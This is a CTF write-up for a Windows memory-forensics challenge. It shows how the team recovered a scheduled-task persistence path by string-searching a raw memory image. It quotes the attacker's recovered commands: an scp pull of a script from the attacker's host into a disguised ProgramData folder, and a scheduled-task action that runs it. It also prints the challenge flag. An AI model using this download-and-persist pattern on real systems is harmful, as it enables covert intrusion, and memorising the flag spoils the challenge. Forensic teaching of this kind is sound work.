---
title: Cache Money
tags:
  - DEADFACE CTF 2026
  - Forensics
---

# Cache Money

| | |
|---|---|
| **CTF** | DEADFACE CTF 2026 |
| **Category** | Forensics (memory) |
| **Points** | 150 |
| **Author** | @syyntax |
| **Writeup by** | [TheMusk3teers](../../../members.md)<br>[H0ussamCl4p](https://github.com/H0ussamCl4p) · [chaimae098](https://github.com/chaimae098) · [fatimaezzahralag-ship-it](https://github.com/fatimaezzahralag-ship-it) · [imanebouzbiba](https://github.com/imanebouzbiba) |

## Challenge

> We know a suspicious task launches a PowerShell script from an unusual directory. What is the script's full Windows path?
>
> Submit the flag as `deadface{absolute\file\path}`.

Files given: none new. It uses the `memory.raw` image from [Who Goes There?](who-goes-there.md) (Windows 11 22H2, host `DMF-WS11-042`, compromised user `nkessler`).

## Solution

### Volatility comes up empty

No running process in `windows.cmdline` points at a script. The only PowerShell processes are the attacker's shell (PID 3300, plain `powershell`) and the responders' shell (PID 7472). The scheduled task wasn't running when the image was taken.

The obvious plugin found nothing either:

```bash
vol -q -f memory.raw windows.registry.scheduled_tasks
# WARNING ... Failed to get 'Tasks' key
```

The part of the SOFTWARE hive that holds `Schedule\TaskCache\Tasks` was paged out, so Volatility can't rebuild the task list. `windows.filescan` didn't help either.

### Searching the raw image

PowerShell command history and console buffers often stay in memory, so we searched the raw image for printable strings ending in `.ps1`. Ripgrep handles the 8 GB image in about 3 minutes:

```bash
rg -a -o -i --no-filename '[\x20-\x7e]{0,150}\.ps1' memory.raw \
  | grep -viE 'v1\.0.Modules|Program Files.WindowsPowerShell|WinSxS|\\Modules\\' \
  | sort | uniq -c | sort -rn
```

Most hits are module manifests, Pester tests and Defender signature strings. Two lines stood out:

```
6 scp d34th@10.77.10.66:/home/d34th/telemetry.ps1
5 Test-Path C:\ProgramData\WindowsCache\telemetry.ps1
```

`10.77.10.66` is the rogue Kali box from the earlier challenges. Searching around `WindowsCache` / `telemetry.ps1` recovered the attacker's command history from their SSH session as nkessler:

```bash
rg -a -o -i --no-filename '[\x20-\x7e]{0,200}(WindowsCache|telemetry\.ps1)[\x20-\x7e]{0,200}' memory.raw \
  | sort | uniq -c | sort -rn
```

```powershell
New-Item -ItemType Directory -Force C:\ProgramData\WindowsCache
scp d34th@10.77.10.66:/home/d34th/telemetry.ps1 C:\ProgramData\WindowsCache\
Test-Path C:\ProgramData\WindowsCache\telemetry.ps1
dir C:\ProgramData\WindowsCache\
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -File C:\ProgramData\WindowsCache\telemetry.ps1'
```

In order, the attacker:

1. Created a folder called `WindowsCache` under `C:\ProgramData`. It sounds like part of Windows, but Windows doesn't create it.
2. Pulled `telemetry.ps1` from their Kali box (user `d34th`) with `scp`.
3. Checked the file was there.
4. Built a scheduled task action that runs it with `powershell.exe -NoProfile -File`, which gives them persistence.

That `-File` argument is the "suspicious task" from the challenge.

!!! note "Windows Defender"
    On Windows, Defender locked every file we saved containing these strings (`Permission denied` on the output file). Pipe the results straight to the terminal, or do the search on Linux.

## Flag

!!! flag "Flag"
    `deadface{C:\ProgramData\WindowsCache\telemetry.ps1}`

## Takeaways

When `scheduled_tasks` fails because the registry is paged out, search the raw image for the attacker's commands. PowerShell console buffers keep `New-ScheduledTaskAction` and `Register-ScheduledTask` lines in memory long after they ran. A `.ps1` file in a made-up folder under `C:\ProgramData` is a common persistence spot.
